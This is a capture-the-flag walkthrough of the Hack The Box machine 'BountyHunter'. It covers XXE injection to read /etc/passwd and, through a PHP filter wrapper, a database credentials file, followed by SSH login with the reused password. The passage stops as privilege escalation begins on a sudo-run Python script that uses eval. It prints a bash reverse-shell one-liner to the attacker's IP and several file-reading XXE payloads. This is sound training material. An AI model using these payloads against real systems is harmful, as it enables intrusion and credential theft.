---
title: "BountyHunter"
author: "Me"
date: "October 20, 2021"
output: html_document
---

# BountyHunter

 <div id="boxinfo">
 <div id="textbox">
 <p class="alignleft">**Difficulty**: easy (?/10)</p>
 <p class="aligncenter">**Type**: CTF</p>
 <p class="alignright">**OS**: Linux</p>
 </div>
 <div style="clear: both;"></div>
 </div> 

<div class="img_container">
![desc]({{https://jsom1.github.io/}}/_images/htb_bounty_desc.png){: height="415px" width = 625px"}
</div>

**Ports/services exploited:** 80/web application\\
**Tools:** dirb, gobuster\\
**Techniques:** XXE injection\\
**Keywords:** ? 


## 1. Services enumeration
{:style="color:DarkRed; font-size: 170%;"}

Let's enumerate the running services with *nmap*. We'll use the flags *-sV* to have a verbose output, *-O* to enable OS detection, and *-sC* to enable the most common scripts scan:

<div class="img_container">
![nmap]({{https://jsom1.github.io/}}/_images/htb_bounty_nmap.png)
</div>

Very straightforward start, only an http server running on port 80 and ssh on port 22. This latter appears to be OpenSSH 8.2p1, and I know from experience that it is not vulnerable. Let's focus on the web server.

## 2. Gaining a foothold
{:style="color:DarkRed; font-size: 170%;"}

As usual, the first thing to do is browse to the target's IP and look at the content:

<div class="img_container">
![web server]({{https://jsom1.github.io/}}/_images/htb_bounty_site.png)
</div>

We land on a cool looking site where we see a few potential useful information. For example, we see "can use burp": since this is a CTF, it might be a hint to use Burp to intercept traffic between our machine and the server.\\
There are also 3 tabs: *about* is just an anchor, but *Contact us* and *Portal* bring us to pages with forms where we can submit data. For example, this is the *Portal* page:

<div class="img_container">
![Portal]({{https://jsom1.github.io/}}/_images/htb_bounty_portal.png)
</div>

While looking around the website, we can lanch *dirb* to look for interesting directories. The result is the following:

<div class="img_container">
![dirb]({{https://jsom1.github.io/}}/_images/htb_bounty_dirb.png)
</div>

There are two accessible directories, *asseets* and *resources*. By looking at their content (by simply browsing to *10.10.11.100/resources*), we see a promising *README* file:

<div class="img_container">
![readme]({{https://jsom1.github.io/}}/_images/htb_bounty_readme.png)
</div>

What immediately stands out here is of course the fact that there is a *test* account on the portal that hasn't been disabled. Moreover, it seems we can connect without providing a password.\\
We also learn the existence of a *tracker submit* script and that this latter isn't connected to the database. Finally, developer group permissions have been fixed: that probably means we'll have to escalate our privileges once we have a foothold, but that's why we're here :).

Let's just try to interact with the portal. We cannot submit credentials (*test* with no password), but we can see what it does:

<div class="img_container">
![test portal]({{https://jsom1.github.io/}}/_images/htb_bounty_test.png)
</div>

We see the database isn't ready (probably because the input here is handled by the *tracket submit* script, which isn't connected to the database yet), but we also understand what it does: it simply adds bounty information in an underlying database.\\
Since there are no direct interactions with the DB, we can exclude the possibility of SQL injections for now and will have to find something else.

Still in */ressources*, there's a JavaScript script called *bountylog.js*:

<div class="img_container">
![url]({{https://jsom1.github.io/}}/_images/htb_bounty_url.png)
</div>

We first see a function called *returnSecret()* which takes data as an argument and then does a POST request to *10.10.11.100/tracker_diRbPr00f314.php*. Below this function, there is another one that crafts an xml message from the fields we can fill on *10.10.11.100/log_submit.php*, and uses the *returnSecret()* function (*btoa* converts from binary to ASCII*). This gives us a good understandding of the application. However, we would need to see the content of the *tracker_diRbPr00f314.php* script to get the full picture...

After playing a while with the reporting system (*/log_submit.php*), I saw that there is nothing displayed when we input "<" in any field... Every other input seems to work:

<div class="img_container">
![no output]({{https://jsom1.github.io/}}/_images/htb_bounty_nop.png)
</div>

However, a simple "<" returns no output. It looks like it's not properly sanitized... I thought about trying a simple one-liner PHP reverse shell as follows, but it didn't work:

<div class="img_container">
![php]({{https://jsom1.github.io/}}/_images/htb_bounty_php.png)
</div>

The complete command is the following:

````
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.21/4444 0>&1'");
`````

And in the case that would work, we set up a netcat listener on port 4444 as follows: *sudo nc -nlvp 4444*.
After submitting this, we can inspect the network tab and we see it was Base64 encoded. We can check on any decoding tool:

<div class="img_container">
![decode]({{https://jsom1.github.io/}}/_images/htb_bounty_decode.png)
</div>

However, we receive nothing on our listener. At this point, I had to ask for help... It turns out we should have known, based on the XML output wee see on the previous image, that it might be vulnerable to **XXE injection**. I don't know about that, so let's have a look on the internet (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md):\\
"*An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.*"\\
In other words, it allows an attacker to interfere with an application's processing of XML data, making it possible to view files on the server or interact with any backend that the application itself can access.\\
Well, that sounds promising. There are 2 types of XML Entity:

- XML Internal Entity: If an entity is declared within a DTD (Document Type Definition) it is called as internal entity. Syntax: <!ENTITY entity_name "entity_value">
- XML External Entity: If an entity is declared outside a DTD it is called as external entity. Identified by SYSTEM.Syntax: <!ENTITY entity_name SYSTEM "entity_value">

The web page shows how to test for this vulnerability. First, we'll use Burp to intercept the request when we submit information on */log_submit.php*, send it to the repeater, and click send to forward the request to the web server:

<div class="img_container">
![Burp repeater]({{https://jsom1.github.io/}}/_images/htb_bounty_burp.png)
</div>

We see our request on the left being intercepted, the encoded data, and the server's response on the right after clicking on *Send*. We select the encoded data, which opens the inspector on the right. The *%* in the data indicates that it is url encoded: this is why we first decode that, and then we decode one more time with Base64 (we saw it was Base64 earlier). Finally, we see that our data are sent to the server in XML format. This is where it should ring a bell and makes us think about XML entities.\\

Let's see if it is vulnerable. The website gives the following PoC:

````
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
`````

This is a basic entity test: when the XML parser parses the external entities the result should contain "John" in firstName and "Doe" in lastName. Entities are defined inside the DOCTYPE element. It might help to set the Content-Type: application/xml in the request when sending XML payload to the server.

In our case, we see the XML format on the right side of Burp. We'll use this format with the given PoC, and use any Base64 online encoder to encode it:

<div class="img_container">
![Base64 encode]({{https://jsom1.github.io/}}/_images/htb_bounty_encode.png)
</div>

We copy the encoded XML request, and paste it in Burp under *data*. At this point, we still have to URL encode the payload: we select it, right click and select *Convert selection* > *URL* > *URL-encode keey characters*:

<div class="img_container">
![URL encode]({{https://jsom1.github.io/}}/_images/htb_bounty_burp2.png)
</div>

Finally, we click on *Send* and see if it worked:

<div class="img_container">
![Injection]({{https://jsom1.github.io/}}/_images/htb_bounty_burp3.png)
</div>

And it did! We used the doctype *replace* to replace a field in the request. Now that we know how it works, we can try to read files on the target using the *data* doctype. Still on the web page, the PoC to do that is the following:

````
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
`````

We will once again use the XML template we got on Burp and adapt it to read the password file:

<div class="img_container">
![payload]({{https://jsom1.github.io/}}/_images/htb_bounty_payload.png)
</div>

As before, we copy the Base64 encoded payload, paste it in Burp's repeater, URL encode it and send the request:

<div class="img_container">
![password]({{https://jsom1.github.io/}}/_images/htb_bounty_pw.png)
</div>

And the server returns the file! We see an entry for a user called development (uid 1000). Now it would be interesting to get the */etc/shadow* file, but I couldn't get it... We can get specified files, but we can't list files on the server. Therefore, we can't use that XXE injection vulnerability for further enumeration... Instead, we should know a spcecific file to target. We saw a few files on dirb's output, but we already saw their content. Let's try to use another tool or another wordlist to see if we can find anything else:

<div class="img_container">
![gobuster]({{https://jsom1.github.io/}}/_images/htb_bounty_gob.png)
</div>

Here I used *gobuster* with the *-x* flag which allows us to specify an extension string. Indeed, we saw some php scripts and can therefore narrow our search this way. We see a new file, *db.php*. Browsing to *10.10.11.100/db.php* shows a blank page, so let's try to display its content with the XXE injection. We can try with the following payload:

````
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///var/www/html/db.php">
]>
 <bugreport>
  <title>John</title>
  <cwe>&file;</cwe>
  <cvss></cvss>
  <reward></reward>
 </bugreport>
`````

As previously, we encode this in Base64 format, paste it in Burp's *data* section, and URL encode it. Unfortunately, this doesn't work. It is very likely due to the specified path (I tried in the web root directory). Looking back at the website, there's a PHP wrapper that we can use as follows (only the *DOCTYPE* line):

````
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
`````
So we can adapt it to retrieve our file:

````
<!DOCTYPE replace [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
`````

<div class="img_container">
![db.php]({{https://jsom1.github.io/}}/_images/htb_bounty_dbphp.png)
</div>

This returns the content of the file in what seems to be Base64 (probably because we specified *base64-encode* in the wrapper). If we decode it (select it, right click > Convert selection > Base64 > Base64-decode) we find the following:

<div class="img_container">
![credentials]({{https://jsom1.github.io/}}/_images/htb_bounty_creds.png)
</div>

We're happy to find credentials to log in the database! However, *nmap* didn't reveal any database, and we saw in the *README* file that the application isn't connected to it. The only logical thing we can do now is try those credentials with SSH and hope that we're dealing with a lazy admin who uses the same password for different applications. After trying with the users admin and test with no success, we see it works for the users development:

<div class="img_container">
![foothold]({{https://jsom1.github.io/}}/_images/htb_bounty_fh.png)
</div>

We saw in */etc/passwd* is a normal user, and it turns out the flag is in its home.


## 3. Privilege escalation
{:style="color:DarkRed; font-size: 170%;"}

Also in its home directory, there's a file called *contract.txt*:

<div class="img_container">
![contract]({{https://jsom1.github.io/}}/_images/htb_bounty_contract.png)
</div>

Apparently, there's a tool for which we have permissions. Let's look at that:

<div class="img_container">
![sudol]({{https://jsom1.github.io/}}/_images/htb_bounty_sudol.png)
</div>

We immediately see the reference: the tool is a python script called *ticketValidator.py*. Let's look at its content:

````
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```````

The script loads a markdown file (*.md*, which is here a ticket) and performs some checks to assess its validity. Also in */opt/skytrain_inc*, there's another directory called *invalid_tickets* that contains examples of invalid tickets:

<div class="img_container">
![tickets]({{https://jsom1.github.io/}}/_images/htb_bounty_tickets.png)
</div>

Looking at the script, we easily see where each of them fails the tests. This is not really important anyways. What's interesting here is that the current user can execute this script with root permissions without providing a password, and we want to find a way to use this to our advantage.\\


<ins>**My thoughts**</ins>


